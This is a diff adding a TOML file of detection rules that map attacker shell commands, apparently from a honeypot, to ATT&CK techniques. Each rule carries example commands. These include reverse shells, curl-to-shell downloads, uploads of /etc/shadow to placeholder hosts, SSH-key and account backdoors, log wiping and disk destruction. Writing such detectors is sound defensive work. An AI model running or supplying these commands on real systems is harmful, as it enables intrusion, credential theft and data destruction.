@@ -1,0 +1,685 @@
+# ATT&CK mapping rules for attacker shell commands.
+#
+# scope = "segment" (default): the pattern runs on each simple command after
+#         normalisation (sudo/nohup/env and directory prefixes removed).
+# scope = "command": the pattern runs on the whole original line, for patterns
+#         that span a pipe or redirect.
+# confidence: how specific the pattern is (low | medium | high), not how dangerous
+#         the command is.
+# Every rule lists examples that must match and not_examples that must not; the
+# test suite checks them all. Technique IDs are checked against the vendored
+# ATT&CK catalog (Enterprise ATT&CK v19).
+
+# ---------------------------------------------------------------- Discovery
+
+[[rule]]
+id = "discovery-system-info"
+technique = "T1082"
+confidence = "high"
+description = "Querying OS, kernel, CPU, memory or disk details"
+pattern = '''^(uname|hostnamectl|lscpu|lsb_release|nproc|free|dmidecode|lshw|arch|getconf|hostname|uptime|df|lsblk)(\s|$)'''
+examples = ["uname -a", "uname -s -v -n -r -m", "lscpu", "free -m", "nproc", "df -h"]
+not_examples = ["unameit", "echo uname"]
+
+[[rule]]
+id = "discovery-system-files"
+technique = "T1082"
+confidence = "high"
+description = "Reading kernel and distribution information files"
+pattern = '''^(cat|head|tail|less|more|grep)\s+.*(/proc/(cpuinfo|meminfo|version|uptime|mounts|loadavg|partitions)|/etc/(os-release|issue|[a-z]+[-_]release|hostname))'''
+examples = ["cat /proc/cpuinfo", "cat /proc/cpuinfo | grep name | wc -l", "cat /etc/os-release", "cat /proc/mounts"]
+not_examples = ["cat /etc/passwd", "ls /proc/cpuinfo"]
+
+[[rule]]
+id = "discovery-current-user"
+technique = "T1033"
+confidence = "high"
+description = "Finding out who is logged in and as whom"
+pattern = '''^(whoami|id|w|who|users|last|lastlog|logname)(\s|$)'''
+examples = ["whoami", "id", "w", "who -a", "last -n 5"]
+not_examples = ["idle", "wget http://x/w"]
+
+[[rule]]
+id = "discovery-network-config"
+technique = "T1016"
+confidence = "high"
+description = "Enumerating interfaces, routes and resolver settings"
+pattern = '''^(ifconfig|ip\s+(a|addr|address|link|route|r|neigh)|route|iwconfig|resolvectl)(\s|$)|^(cat|head)\s+(/etc/resolv\.conf|/proc/net/(route|arp|dev))'''
+examples = ["ifconfig", "ip a", "ip route show", "cat /etc/resolv.conf", "route -n"]
+not_examples = ["ipconfig-fake", "echo ifconfig"]
+
+[[rule]]
+id = "discovery-external-ip"
+technique = "T1016.001"
+confidence = "high"
+description = "Checking the host's public IP or internet reachability"
+pattern = '''^(curl|wget)\s+.*(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com|ipecho|myexternalip)'''
+examples = ["curl ifconfig.me", "wget -qO- icanhazip.com", "curl -s https://ipinfo.io/ip"]
+not_examples = ["curl http://evil.example/a.sh"]
+
+[[rule]]
+id = "discovery-network-connections"
+technique = "T1049"
+confidence = "high"
+description = "Listing open sockets and connections"
+pattern = '''^(netstat|ss|lsof\s+-i)(\s|$)|^cat\s+/proc/net/(tcp|udp)'''
+examples = ["netstat -antp", "ss -tulpn", "lsof -i :22", "cat /proc/net/tcp"]
+not_examples = ["ssh host", "sshd"]
+
+[[rule]]
+id = "discovery-processes"
+technique = "T1057"
+confidence = "high"
+description = "Listing running processes"
+pattern = '''^(ps|top|htop|pgrep|pidof|pstree)(\s|$)'''
+examples = ["ps aux", "ps -ef | grep -v grep", "top -bn1", "pidof sshd"]
+not_examples = ["psql", "topgun"]
+
+[[rule]]
+id = "discovery-files"
+technique = "T1083"
+confidence = "low"
+description = "Browsing the filesystem (common and noisy, so low confidence)"
+pattern = '''^(ls|find|locate|tree|stat|du)(\s|$)'''
+examples = ["ls", "ls -la /tmp", "find / -name id_rsa", "locate passwd"]
+not_examples = ["lsof -i", "lsattr"]
+
+[[rule]]
+id = "discovery-local-accounts"
+technique = "T1087.001"
+confidence = "high"
+description = "Reading the local account list"
+pattern = '''^(cat|head|tail|less|more|grep|awk|cut)\s+.*/etc/passwd\b|^getent\s+passwd'''
+examples = ["cat /etc/passwd", "grep root /etc/passwd", "getent passwd"]
+not_examples = ["cat /etc/shadow", "passwd root"]
+
+[[rule]]
+id = "discovery-local-groups"
+technique = "T1069.001"
+confidence = "medium"
+description = "Listing local groups and memberships"
+pattern = '''^(groups|getent\s+group|cat\s+/etc/group)(\s|$)'''
+examples = ["groups", "getent group sudo", "cat /etc/group"]
+not_examples = ["grouping"]
+
+[[rule]]
+id = "discovery-software"
+technique = "T1518"
+confidence = "low"
+description = "Checking which tools or packages are installed"
+pattern = '''^(dpkg\s+(-l|--list)|rpm\s+-qa|apt\s+list|yum\s+list|pip3?\s+(list|freeze)|which|whereis|type|command\s+-v)(\s|$)'''
+examples = ["which wget", "dpkg -l", "rpm -qa", "whereis curl", "command -v python3"]
+not_examples = ["whichever", "dpkg -i x.deb"]
+
+[[rule]]
+id = "discovery-busybox-probe"
+technique = "T1518"
+confidence = "low"
+description = "Mirai-family probe: runs a made-up busybox applet to confirm busybox exists"
+pattern = '''^(/bin/)?busybox\s+[A-Z0-9]{4,}\s*$'''
+examples = ["/bin/busybox ECCHI", "busybox ZXXX"]
+not_examples = ["busybox wget http://x/a", "busybox"]
+
+[[rule]]
+id = "discovery-services"
+technique = "T1007"
+confidence = "medium"
+description = "Listing system services"
+pattern = '''^(systemctl\s+(list-units|list-unit-files|status|is-active)|service\s+--status-all|chkconfig\s+--list)'''
+examples = ["systemctl list-units", "service --status-all", "systemctl status sshd"]
+not_examples = ["systemctl enable x"]
+
+[[rule]]
+id = "discovery-system-time"
+technique = "T1124"
+confidence = "low"
+description = "Reading the system clock (noisy, so low confidence)"
+pattern = '''^(date|timedatectl|hwclock)(\s|$)'''
+examples = ["date", "timedatectl"]
+not_examples = ["update-rc.d x"]
+
+[[rule]]
+id = "discovery-log-enumeration"
+technique = "T1654"
+confidence = "medium"
+description = "Reading system logs"
+pattern = '''^(cat|less|more|tail|head|grep|zcat|journalctl)\s+.*(/var/log/|^journalctl)|^journalctl(\s|$)'''
+examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog", "journalctl -xe"]
+not_examples = ["rm /var/log/auth.log"]
+
+[[rule]]
+id = "discovery-remote-systems"
+technique = "T1018"
+confidence = "medium"
+description = "Finding neighbouring hosts"
+pattern = '''^arp(\s|$)|^cat\s+/etc/hosts\b'''
+examples = ["arp -a", "cat /etc/hosts"]
+not_examples = ["cat /etc/passwd"]
+
+[[rule]]
+id = "discovery-network-scan"
+technique = "T1046"
+confidence = "high"
+description = "Scanning for open services"
+pattern = '''^(nmap|masscan|zmap|zgrab|nikto|unicornscan)(\s|$)|^(nc|ncat|netcat)\s+(-\w*\s+)*-\w*z'''
+examples = ["nmap -sS 10.0.0.0/24", "masscan -p22 0.0.0.0/0", "nc -zv 10.0.0.1 22"]
+not_examples = ["nc -l 4444"]
+
+[[rule]]
+id = "discovery-password-policy"
+technique = "T1201"
+confidence = "medium"
+description = "Inspecting password policy"
+pattern = '''^(chage\s+-l|cat\s+/etc/(login\.defs|pam\.d/\S+|security/pwquality\.conf))'''
+examples = ["chage -l root", "cat /etc/login.defs"]
+not_examples = ["chage -M 99999 root"]
+
+[[rule]]
+id = "discovery-virtualization"
+technique = "T1497"
+confidence = "medium"
+description = "Checking whether the host is a VM or sandbox"
+pattern = '''^(systemd-detect-virt|virt-what)(\s|$)|^(grep|egrep)\s+.*(hypervisor|vmware|virtualbox|qemu|kvm)'''
+examples = ["systemd-detect-virt", "virt-what", "grep -i hypervisor /proc/cpuinfo"]
+not_examples = ["grep root /etc/passwd"]
+
+# ------------------------------------------------------- Credential access
+
+[[rule]]
+id = "credential-shadow"
+technique = "T1003.008"
+confidence = "high"
+description = "Reading or copying the password hash file"
+pattern = '''^(cat|less|more|head|tail|grep|cp|cut|awk)\s+.*/etc/g?shadow\b|^unshadow(\s|$)'''
+examples = ["cat /etc/shadow", "cp /etc/shadow /tmp/s", "unshadow /etc/passwd /etc/shadow"]
+not_examples = ["cat /etc/passwd"]
+
+[[rule]]
+id = "credential-shell-history"
+technique = "T1552.003"
+confidence = "high"
+description = "Reading shell history for secrets"
+pattern = '''^history(\s+\d+)?\s*$|^(cat|less|more|head|tail|grep)\s+.*\.(bash_|zsh_|sh_)?history\b'''
+examples = ["history", "history 50", "cat ~/.bash_history", "grep ssh ~/.bash_history"]
+not_examples = ["history -c", "rm ~/.bash_history"]
+
+[[rule]]
+id = "credential-private-keys"
+technique = "T1552.004"
+confidence = "medium"
+description = "Looking for or copying private keys"
+pattern = '''^(cat|cp|scp|tar|find|grep|head|tail|less|ls)\s+.*(id_(rsa|dsa|ecdsa|ed25519)\b|\.pem\b|/\.ssh(/|\s|$))'''
+examples = ["cat ~/.ssh/id_rsa", "find / -name id_rsa", "ls ~/.ssh", "cp server.pem /tmp"]
+not_examples = ["cat /etc/passwd"]
+
+[[rule]]
+id = "credential-files"
+technique = "T1552.001"
+confidence = "high"
+description = "Reading well-known credential files"
+pattern = '''^(cat|less|more|head|tail|grep|cp)\s+.*(\.aws/credentials|\.git-credentials|\.netrc|\.pgpass|\.my\.cnf|wp-config\.php|\.docker/config\.json|/\.env\b)'''
+examples = ["cat ~/.aws/credentials", "cat wp-config.php", "cat /var/www/.env"]
+not_examples = ["cat /etc/hostname"]
+
+[[rule]]
+id = "credential-brute-force-tool"
+technique = "T1110"
+confidence = "high"
+description = "Running a password-guessing tool from the honeypot"
+pattern = '''^(hydra|medusa|ncrack|patator|sshcrack|crackmapexec|john|hashcat)(\s|$)'''
+examples = ["hydra -l root -P pass.txt ssh://10.0.0.1", "john hashes.txt"]
+not_examples = ["johnny"]
+
+# -------------------------------------------------------------- Persistence
+
+[[rule]]
+id = "persistence-ssh-keys"
+technique = "T1098.004"
+confidence = "high"
+scope = "command"
+description = "Adding or altering an SSH authorized key for backdoor access"
+pattern = '''(>>?\s*\S*authorized_keys|\btee\s+(-a\s+)?\S*authorized_keys|\bssh-copy-id\b|\b(cp|mv|chmod|chattr)\s+.*authorized_keys|\bsed\s+-i.*authorized_keys)'''
+examples = ["echo ssh-rsa AAAAB3 attacker >> ~/.ssh/authorized_keys", "cat key.pub >> .ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys", "ssh-copy-id root@host"]
+not_examples = ["cat ~/.ssh/authorized_keys", "ls ~/.ssh"]
+
+[[rule]]
+id = "persistence-cron-write"
+technique = "T1053.003"
+confidence = "high"
+scope = "command"
+description = "Installing a cron job"
+pattern = '''(\|\s*crontab\s+-\s*$|^\s*crontab\s+(-r\b|-e\b|[^-\s])|>>?\s*/etc/crontab|>>?\s*\S*/(cron\.d|crontabs|cron\.(hourly|daily|weekly|monthly))/|\b(cp|mv|tee|install)\s+.*/etc/cron)'''
+examples = ["(crontab -l; echo '* * * * * /tmp/x') | crontab -", "echo '* * * * * root /tmp/x' >> /etc/crontab", "crontab mycron", "cp x /etc/cron.d/x"]
+not_examples = ["crontab -l", "ls /etc/cron.d"]
+
+[[rule]]
+id = "persistence-cron-list"
+technique = "T1053.003"
+confidence = "low"
+description = "Listing the user's cron jobs"
+pattern = '''^crontab\s+-l\b|^cat\s+/etc/crontab'''
+examples = ["crontab -l", "cat /etc/crontab"]
+not_examples = ["crontab mycron"]
+
+[[rule]]
+id = "persistence-systemd-enable"
+technique = "T1543.002"
+confidence = "high"
+description = "Enabling or registering a systemd service"
+pattern = '''^systemctl\s+(enable|daemon-reload|link)\b'''
+examples = ["systemctl enable backdoor.service", "systemctl daemon-reload"]
+not_examples = ["systemctl status sshd", "systemctl stop firewalld"]
+
+[[rule]]
+id = "persistence-systemd-unit"
+technique = "T1543.002"
+confidence = "high"
+scope = "command"
+description = "Writing a systemd unit file"
+pattern = '''(>>?|\btee\b|\bcp\b|\bmv\b)[^|;&]*/(etc|lib|usr/lib)/systemd/system/'''
+examples = ["cp x.service /etc/systemd/system/x.service", "echo '[Service]' > /etc/systemd/system/x.service"]
+not_examples = ["ls /etc/systemd/system/"]
+
+[[rule]]
+id = "persistence-rc-scripts"
+technique = "T1037.004"
+confidence = "high"
+scope = "command"
+description = "Adding a boot-time script via rc.local or init.d"
+pattern = '''((>>?|\btee\b|\bcp\b|\bmv\b|\bsed\s+-i)[^|;&]*(/etc/rc\.local|/etc/init\.d/|/etc/rc\d?\.d/))|(^|[;&|]\s*)(update-rc\.d|chkconfig)\s'''
+examples = ["echo '/tmp/x &' >> /etc/rc.local", "cp x /etc/init.d/x", "update-rc.d x defaults"]
+not_examples = ["cat /etc/rc.local"]
+
+[[rule]]
+id = "persistence-shell-profile"
+technique = "T1546.004"
+confidence = "high"
+scope = "command"
+description = "Modifying shell startup files so code runs at every login"
+pattern = '''(>>?|\btee\b(\s+-a)?|\bsed\s+-i|\bcp\b|\bmv\b)[^|;&]*(\.bashrc|\.bash_profile|\.bash_login|\.profile|/etc/profile(\.d/\S*)?|/etc/bash\.bashrc|\.zshrc|\.bash_logout)\b'''
+examples = ["echo '/tmp/x &' >> ~/.bashrc", "echo x >> /etc/profile", "cp x /etc/profile.d/x.sh"]
+not_examples = ["cat ~/.bashrc", "ls -a ~"]
+
+[[rule]]
+id = "persistence-create-account"
+technique = "T1136.001"
+confidence = "high"
+description = "Creating a local account"
+pattern = '''^(useradd|adduser|newusers)(\s|$)'''
+examples = ["useradd -m -s /bin/bash backdoor", "adduser hacker"]
+not_examples = ["userdel hacker"]
+
+[[rule]]
+id = "persistence-passwd-write"
+technique = "T1136.001"
+confidence = "high"
+scope = "command"
+description = "Appending a user directly to /etc/passwd"
+pattern = '''>>?\s*/etc/passwd\b'''
+examples = ["echo 'x:x:0:0::/root:/bin/sh' >> /etc/passwd"]
+not_examples = ["cat /etc/passwd"]
+
+[[rule]]
+id = "persistence-account-manipulation"
+technique = "T1098"
+confidence = "high"
+description = "Changing passwords, groups or account settings"
+pattern = '''^(passwd|chpasswd|usermod|chage|gpasswd)(\s|$)'''
+examples = ["passwd", "echo root:pass | chpasswd", "usermod -aG sudo bob", "passwd root"]
+not_examples = ["cat /etc/passwd"]
+
+[[rule]]
+id = "persistence-ld-preload"
+technique = "T1574.006"
+confidence = "high"
+scope = "command"
+description = "Hijacking the dynamic linker to load attacker code"
+pattern = '''(\bLD_PRELOAD=|/etc/ld\.so\.preload)'''
+examples = ["echo /tmp/x.so > /etc/ld.so.preload", "LD_PRELOAD=/tmp/x.so ls"]
+not_examples = ["ldd /bin/ls"]
+
+# ------------------------------------------------------ Privilege escalation
+
+[[rule]]
+id = "privesc-sudo-use"
+technique = "T1548.003"
+confidence = "low"
+scope = "command"
+description = "Using sudo"
+pattern = '''(^|[;&|]\s*)sudo\s'''
+examples = ["sudo su", "cd /tmp; sudo -l"]
+not_examples = ["pseudo x"]
+
+[[rule]]
+id = "privesc-sudoers"
+technique = "T1548.003"
+confidence = "high"
+scope = "command"
+description = "Granting passwordless sudo"
+pattern = '''(/etc/sudoers|\bNOPASSWD\b|(^|[;&|]\s*)visudo\b)'''
+examples = ["echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "visudo"]
+not_examples = ["sudo ls"]
+
+[[rule]]
+id = "evasion-chattr"
+technique = "T1222.002"
+confidence = "medium"
+description = "Changing file attributes, e.g. unlocking .ssh before planting a key or locking a backdoor"
+pattern = '''^chattr\s+'''
+examples = ["chattr -ia .ssh", "chattr +i /root/.ssh/authorized_keys"]
+not_examples = ["lsattr -a"]
+
+[[rule]]
+id = "privesc-setuid"
+technique = "T1548.001"
+confidence = "medium"
+description = "Setting the setuid or setgid bit"
+pattern = '''^chmod\s+(-\S+\s+)*([ugoa]*\+[rwxt]*s|[0-7]?[2467][0-7]{3}\s)'''
+examples = ["chmod u+s /bin/bash", "chmod +s /tmp/x", "chmod 4755 /tmp/x"]
+not_examples = ["chmod 755 x", "chmod +x x"]
+
+# ------------------------------------------------------ Execution and C2
+
+[[rule]]
+id = "c2-download"
+technique = "T1105"
+confidence = "high"
+description = "Fetching a file onto the host"
+pattern = '''^(wget|curl|tftp|ftpget|fetch|lwp-download|aria2c|axel)(?!.*(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com))(\s|$)|^git\s+clone\s'''
+examples = ["wget http://203.0.113.9/a.sh", "curl -O http://x.example/b", "tftp -g -r bot 10.0.0.1", "cd /tmp; wget http://x/y", "git clone https://github.com/x/y"]
+not_examples = ["curl ifconfig.me", "wgetx"]
+
+[[rule]]
+id = "exec-permission-change"
+technique = "T1222.002"
+confidence = "medium"
+description = "Making a file executable (usually right after downloading it)"
+pattern = '''^chmod\s+(-\S+\s+)*([ugoa]*\+[rwst]*x|(?=[0-7]{3,4}\s)[0-7]*[1357])'''
+examples = ["chmod +x a.sh", "chmod 777 a.sh", "chmod 755 /tmp/x", "chmod -R 777 /tmp"]
+not_examples = ["chmod 600 key", "chmod 644 file"]
+
+[[rule]]
+id = "exec-shell"
+technique = "T1059.004"
+confidence = "medium"
+description = "Running a shell or shell script"
+pattern = '''^(sh|bash|dash|ash|zsh|ksh)(\s|$)'''
+examples = ["sh", "bash -c 'id'", "sh a.sh", "bash x.sh"]
+not_examples = ["shutdown", "shred x"]
+
+[[rule]]
+id = "exec-pipe-to-shell"
+technique = "T1059.004"
+confidence = "high"
+scope = "command"
+description = "Piping downloaded or decoded content straight into a shell"
+pattern = '''\|\s*(sudo\s+)?(sh|bash|dash|ash|zsh)(\s|$)'''
+examples = ["curl http://x/a | sh", "wget -qO- http://x/a | bash", "echo ZWNobyBoaQ== | base64 -d | sh"]
+not_examples = ["cat x | grep sh", "ls | shred"]
+
+[[rule]]
+id = "exec-dropped-file"
+technique = "T1059.004"
+confidence = "low"
+description = "Running a file from the current or a world-writable directory"
+pattern = '''^(\./|/tmp/|/var/tmp/|/dev/shm/)\S+'''
+examples = ["./a.sh", "/tmp/x", "/dev/shm/bot -p 1"]
+not_examples = ["ls /tmp/x"]
+
+[[rule]]
+id = "exec-python"
+technique = "T1059.006"
+confidence = "high"
+description = "Running Python code or scripts"
+pattern = '''^python[23]?(\.\d+)?\s+(-c|-m|\S+\.py)'''
+examples = ["python -c 'import os'", "python3 x.py", "python3.11 -m http.server"]
+not_examples = ["pythonista"]
+
+[[rule]]
+id = "exec-python-pipe"
+technique = "T1059.006"
+confidence = "high"
+scope = "command"
+description = "Piping content into a Python interpreter"
+pattern = '''\|\s*(sudo\s+)?python[23]?(\s|$)'''
+examples = ["curl http://x/a.py | python3"]
+not_examples = ["python3 x.py"]
+
+[[rule]]
+id = "exec-scripting-interpreter"
+technique = "T1059"
+confidence = "medium"
+description = "Running Perl, PHP, Ruby, Node or Lua code"
+pattern = '''^(perl|php|ruby|node|lua)\s+(-\S+|\S+\.(pl|php|rb|js|lua))'''
+examples = ["perl -e 'print 1'", "perl x.pl", "php -r 'phpinfo();'"]
+not_examples = ["perlbrew"]
+
+[[rule]]
+id = "exec-reverse-shell"
+technique = "T1059.004"
+confidence = "high"
+scope = "command"
+description = "Reverse-shell construction"
+pattern = '''(/dev/(tcp|udp)/|\b(nc|ncat|netcat)\b.*\s-e\s|\bsocat\b.*exec:|\bmkfifo\b.*\bnc\b|\bbash\s+-i\b)'''
+examples = ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"]
+not_examples = ["nc -l 4444"]
+
+[[rule]]
+id = "c2-raw-socket-tool"
+technique = "T1095"
+confidence = "medium"
+description = "Using netcat or socat for raw network channels"
+pattern = '''^(nc|ncat|netcat|socat)(\s|$)'''
+examples = ["nc 10.0.0.1 4444", "socat TCP:10.0.0.1:4444 EXEC:/bin/sh"]
+not_examples = ["ncdu"]
+
+[[rule]]
+id = "c2-tunnel"
+technique = "T1572"
+confidence = "high"
+description = "Tunnelling traffic through SSH"
+pattern = '''^ssh\s+(.*\s)?-\w*[LRD]\s?\S'''
+examples = ["ssh -R 8080:localhost:80 user@host", "ssh -D 1080 user@host", "ssh -N -L 3306:db:3306 u@h"]
+not_examples = ["ssh user@host"]
+
+[[rule]]
+id = "c2-proxy"
+technique = "T1090"
+confidence = "medium"
+description = "Setting up or using a proxy"
+pattern = '''^(proxychains\d*|tinyproxy|3proxy|redsocks|dante|danted)(\s|$)'''
+examples = ["proxychains4 nmap x", "3proxy cfg"]
+not_examples = ["proxy"]
+
+[[rule]]
+id = "c2-remote-access-tool"
+technique = "T1219"
+confidence = "high"
+scope = "command"
+description = "Installing or running a remote-access tool"
+pattern = '''\b(anydesk|teamviewer|rustdesk|ngrok|chisel|frpc|cloudflared)\b'''
+examples = ["wget http://x/ngrok.zip", "./chisel client x:8080 R:socks"]
+not_examples = ["ls"]
+
+[[rule]]
+id = "lateral-ssh"
+technique = "T1021.004"
+confidence = "medium"
+description = "Connecting onward over SSH"
+pattern = '''^(ssh|sshpass|scp|sftp)\s+(?!-V)'''
+examples = ["ssh root@10.0.0.2", "sshpass -p x ssh root@h", "scp a.sh root@h:/tmp"]
+not_examples = ["ssh-keygen -t rsa", "sshd"]
+
+[[rule]]
+id = "exec-decode-payload"
+technique = "T1140"
+confidence = "high"
+scope = "command"
+description = "Decoding an encoded payload on the host"
+pattern = '''\b(base64\s+(-d|--decode)|xxd\s+-r|openssl\s+enc\s+.*-d\b|uudecode)\b'''
+examples = ["echo ZWNobyBoaQ== | base64 -d", "base64 --decode payload.b64 > x", "xxd -r -p hex > bin"]
+not_examples = ["base64 file.txt"]
+
+[[rule]]
+id = "obfuscation-hex-escapes"
+technique = "T1027"
+confidence = "medium"
+scope = "command"
+description = "Long hex-escaped strings, typical of binary dropped with echo -e"
+pattern = '''(\\x[0-9a-fA-F]{2}){8,}'''
+examples = [ "echo -e '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00' > bin" ]
+not_examples = ["echo -e '\\x41'"]
+
+[[rule]]
+id = "impact-cryptomining"
+technique = "T1496.001"
+confidence = "high"
+scope = "command"
+description = "Cryptocurrency miner tooling or pool addresses"
+pattern = '''(\b(xmrig|minerd|cpuminer|ethminer|cgminer|bfgminer|nbminer|kinsing|kdevtmpfsi)\b|stratum\+(tcp|ssl)://|--donate-level|pool\.minexmr|nanopool|supportxmr|moneroocean)'''
+examples = ["./xmrig -o stratum+tcp://pool.example:3333", "wget http://x/kinsing", "./minerd -a cryptonight"]
+not_examples = ["ls /tmp"]
+
+# ------------------------------------------------------------ Defense evasion
+
+[[rule]]
+id = "evasion-clear-history"
+technique = "T1070.003"
+confidence = "high"
+scope = "command"
+description = "Erasing shell history"
+pattern = '''(\bhistory\s+-[cw]\b|>\s*\S*\.(bash_|zsh_)?history\b|\brm\s+(-\S+\s+)*\S*\.(bash_|zsh_)?history\b|\bln\s+-s\w*\s+/dev/null\s+\S*history)'''
+examples = ["history -c", "cat /dev/null > ~/.bash_history", "rm -f ~/.bash_history", "ln -sf /dev/null ~/.bash_history"]
+not_examples = ["history", "cat ~/.bash_history"]
+
+[[rule]]
+id = "evasion-prevent-history"
+technique = "T1690"
+confidence = "high"
+scope = "command"
+description = "Stopping the shell from recording commands"
+pattern = '''(\bunset\s+HISTFILE\b|\bHISTFILE=(/dev/null)?(\s|;|$)|\bHISTSIZE=0\b|\bHISTFILESIZE=0\b|\bset\s+\+o\s+history\b)'''
+examples = ["unset HISTFILE", "export HISTSIZE=0", "set +o history", "HISTFILE=/dev/null"]
+not_examples = ["history"]
+
+[[rule]]
+id = "evasion-clear-logs"
+technique = "T1685.006"
+confidence = "high"
+scope = "command"
+description = "Deleting or truncating system logs"
+pattern = '''((\brm\b|\btruncate\b|\bshred\b|>)\s*[^|;&<>]*?/var/log/\S*|\b(rm|truncate|shred)\b.*\b(wtmp|btmp|lastlog|utmp)\b|\bjournalctl\s+--(vacuum|rotate)|\blogrotate\s+-f)'''
+examples = ["rm -rf /var/log/*", "> /var/log/auth.log", "truncate -s 0 /var/log/syslog", "rm /var/log/wtmp", "journalctl --vacuum-time=1s"]
+not_examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog"]
+
+[[rule]]
+id = "evasion-delete-files"
+technique = "T1070.004"
+confidence = "medium"
+description = "Deleting files, usually to remove the dropper after running it"
+pattern = '''^(rm|unlink)(\s|$)'''
+examples = ["rm a.sh", "rm -rf /tmp/x", "unlink /tmp/x"]
+not_examples = ["rmdir", "rmmod x"]
+
+[[rule]]
+id = "evasion-timestomp"
+technique = "T1070.006"
+confidence = "high"
+description = "Altering file timestamps"
+pattern = '''^touch\s+(.*\s)?(-[admrt]+\b|--(date|reference)\b)'''
+examples = ["touch -r /bin/ls x", "touch -d '2020-01-01' x", "touch -t 202001010000 x"]
+not_examples = ["touch x"]
+
+[[rule]]
+id = "evasion-hidden-staging"
+technique = "T1564.001"
+confidence = "medium"
+scope = "command"
+description = "Using a hidden file or directory in a world-writable location"
+pattern = '''(/tmp|/var/tmp|/dev/shm)/\.[A-Za-z0-9_]'''
+examples = ["mkdir /tmp/.x", "cd /dev/shm/.hidden", "wget -O /var/tmp/.a http://x/a"]
+not_examples = ["cd /tmp", "ls /tmp/x"]
+
+[[rule]]
+id = "defense-impair-firewall"
+technique = "T1686"
+confidence = "high"
+description = "Flushing or disabling the host firewall"
+pattern = '''^((iptables|ip6tables)\s+.*(-F\b|--flush|-X\b|-P\s+\w+\s+ACCEPT)|nft\s+flush|ufw\s+(disable|reset)|(systemctl|service)\s+(stop|disable)\s+(firewalld|ufw|iptables|nftables)|service\s+(firewalld|ufw|iptables)\s+stop)'''
+examples = ["iptables -F", "iptables -P INPUT ACCEPT", "ufw disable", "systemctl stop firewalld", "service iptables stop"]
+not_examples = ["iptables -L", "ufw status"]
+
+[[rule]]
+id = "defense-impair-tools"
+technique = "T1685"
+confidence = "high"
+description = "Switching off security tooling"
+pattern = '''^(setenforce\s+0|(systemctl|service)\s+(stop|disable)\s+(auditd|apparmor|rsyslog|syslog|wazuh-agent|ossec|falcon-sensor|clamav\S*|aegis|aliyun\S*|sentinelone|osqueryd)|service\s+(auditd|apparmor|rsyslog)\s+stop|(pkill|killall)\s+.*(auditd|rsyslog|wazuh|ossec|aegis|aliyun|barad|yunjing))'''
+examples = ["setenforce 0", "systemctl stop auditd", "service rsyslog stop", "pkill -9 aliyun"]
+not_examples = ["getenforce", "systemctl status auditd"]
+
+[[rule]]
+id = "defense-impair-audit"
+technique = "T1685.004"
+confidence = "high"
+description = "Disabling or clearing the Linux audit rules"
+pattern = '''^auditctl\s+(-e\s*0|-D)\b'''
+examples = ["auditctl -e 0", "auditctl -D"]
+not_examples = ["auditctl -l"]
+
+# -------------------------------------------------------- Impact / collection
+
+[[rule]]
+id = "impact-service-stop"
+technique = "T1489"
+confidence = "medium"
+description = "Stopping a service"
+pattern = '''^(systemctl|service)\s+(stop|disable|kill)\s|^service\s+\S+\s+stop\b'''
+examples = ["systemctl stop nginx", "service apache2 stop"]
+not_examples = ["systemctl start nginx"]
+
+[[rule]]
+id = "impact-shutdown"
+technique = "T1529"
+confidence = "high"
+description = "Shutting down or rebooting the host"
+pattern = '''^(reboot|shutdown|halt|poweroff|init\s+[06])(\s|$)|^systemctl\s+(reboot|poweroff|halt)\b'''
+examples = ["reboot", "shutdown -h now", "init 0", "systemctl poweroff"]
+not_examples = ["shutdownx"]
+
+[[rule]]
+id = "impact-destroy-data"
+technique = "T1485"
+confidence = "high"
+scope = "command"
+description = "Destroying data or disks"
+pattern = '''(\brm\s+(-\S+\s+)+(--no-preserve-root\s+)?/\*?(\s|$)|--no-preserve-root|\bdd\s+if=/dev/(zero|urandom|random)\s+of=/dev/(sd|vd|nvme|xvd)|\bmkfs(\.\w+)?\s+/dev/|\bwipefs\b)'''
+examples = ["rm -rf /", "rm -rf /*", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sda1"]
+not_examples = ["rm -rf /tmp/x", "rm a.sh"]
+
+[[rule]]
+id = "impact-account-removal"
+technique = "T1531"
+confidence = "medium"
+description = "Deleting or locking accounts"
+pattern = '''^(userdel|deluser)(\s|$)|^usermod\s+.*-L\b|^passwd\s+(-l|-d)\b'''
+examples = ["userdel admin", "passwd -l admin", "usermod -L bob"]
+not_examples = ["useradd bob"]
+
+[[rule]]
+id = "collection-archive"
+technique = "T1560.001"
+confidence = "medium"
+description = "Compressing files with an archive utility"
+pattern = '''^(tar\s+(-?\w*c\w*|--create)\b|zip\s|7z\s+a\b|7za\s+a\b|rar\s+a\b)'''
+examples = ["tar czf out.tgz /etc", "tar -cvf x.tar dir", "zip -r x.zip dir", "7z a x.7z dir"]
+not_examples = ["tar xzf a.tgz", "tar -xvf a.tar"]
+
+[[rule]]
+id = "exfil-upload"
+technique = "T1048"
+confidence = "medium"
+description = "Uploading local data to a remote server"
+pattern = '''^curl\s+(.*\s)?(-T\b|--upload-file|(-F|--form)\s+\S*@|--data-binary\s+@|-d\s+@)|^ftpput(\s|$)'''
+examples = ["curl -T /etc/passwd http://x/u", "curl -F file=@/etc/shadow http://x", "curl --data-binary @data http://x"]
+not_examples = ["curl http://x/a.sh"]
